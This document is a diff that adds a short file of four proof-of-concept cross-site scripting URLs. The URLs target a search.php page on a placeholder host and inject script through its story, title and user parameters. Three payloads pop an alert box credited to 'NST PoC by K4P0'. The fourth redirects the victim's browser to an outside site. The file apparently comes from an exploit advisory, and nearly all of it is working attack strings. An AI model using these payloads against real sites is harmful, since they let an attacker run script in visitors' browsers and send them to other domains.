@@ -1,0 +1,7 @@
+http://www.example.comsearch.php?dosearch=yes&amp;story=%22%3E%3Cscript%3Ealert%28%22NST+PoC+by+K4P0%22%29%3B%3C%2Fscript%3E&amp;title=&amp;user=&amp;from_date_day=&amp;from_date_month=&amp;from_date_year=&amp;to_date_day=&amp;to_date_month=&amp;to_date_year=
+
+http://www.example.comsearch.php?dosearch=yes&amp;title=%22%3E%3Cscript%3Ealert(%22NST%20PoC%20by%20K4P0%22  );%3C/script%3E&amp;user=&amp;from_date_day=&amp;from_date_month=&amp;from_date_year=&amp;to_date_day  =&amp;to_date_month=&amp;to_date_year=
+
+http://www.example.comsearch.php?dosearch=yes&amp;story=K4P0&amp;user=%22%3E%3Cscript%3Ealert(%22NST%20PoC%20by%20K4P0%22);%3C/script%3E&amp;from_date_day=&amp;from_date_month=&amp;from_date_year=&amp;to_date_day=&amp;to_date_month=&amp;to_date_year=
+
+http://www.example.comsearch.php?dosearch=yes&amp;title=&quot;&gt;&lt;script&gt;window.location=&#039;http://www.neosecurityteam.net/&#039;;&lt;/script&gt;&amp;user=&amp;from_date_day=&amp;from_date_month=&amp;from_date_year=&amp;to_date_day=&amp;to_date_month=&amp;to_date_year=
